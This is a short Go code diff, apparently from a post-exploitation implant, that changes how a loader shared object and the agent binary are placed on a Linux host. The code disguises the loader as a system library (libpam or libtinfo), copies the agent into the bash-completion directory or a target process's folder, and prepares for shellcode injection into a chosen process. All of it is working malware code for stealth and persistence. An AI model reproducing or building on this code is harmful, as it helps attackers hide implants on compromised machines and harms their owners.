@@ -89,7 +89,7 @@ func prepare_loader_so(pid int) (so_path string, err error) {
 	so_path = fmt.Sprintf("/%s/libtinfo.so.2.1.%d",
 		RuntimeConfig.UtilsPath, util.RandInt(0, 30))
 	if os.Geteuid() == 0 {
-		so_path = fmt.Sprintf("/usr/lib/x86_64-linux-gnu/libpam.so.1.%d.1", util.RandInt(0, 20))
+		so_path = fmt.Sprintf("/lib64/libpam.so.1.%d.1", util.RandInt(0, 20))
 	}
 	if !util.IsExist(so_path) {
 		out, err := golpe.ExtractFileFromString(file.LoaderSO_Data)
@@ -102,16 +102,19 @@ func prepare_loader_so(pid int) (so_path string, err error) {
 		}
 	}
 
-	// see loader/elf/loader.c
-	agent_path := fmt.Sprintf("%s/_%s",
-		util.ProcCwd(pid),
-		util.FileBaseName(util.ProcExePath(pid)))
-	if HasRoot() {
-		agent_path = fmt.Sprintf("/usr/share/bash-completion/completions/%s",
+	if pid > 0 {
+		// see loader/elf/loader.c
+		agent_path := fmt.Sprintf("%s/_%s",
+			util.ProcCwd(pid),
 			util.FileBaseName(util.ProcExePath(pid)))
+		if HasRoot() {
+			agent_path = fmt.Sprintf("/usr/share/bash-completion/completions/%s",
+				util.FileBaseName(util.ProcExePath(pid)))
+		}
+		err = CopySelfTo(agent_path)
 	}
 
-	return so_path, CopySelfTo(agent_path)
+	return
 }
 
 // prepare for guardian_shellcode injection, targeting pid
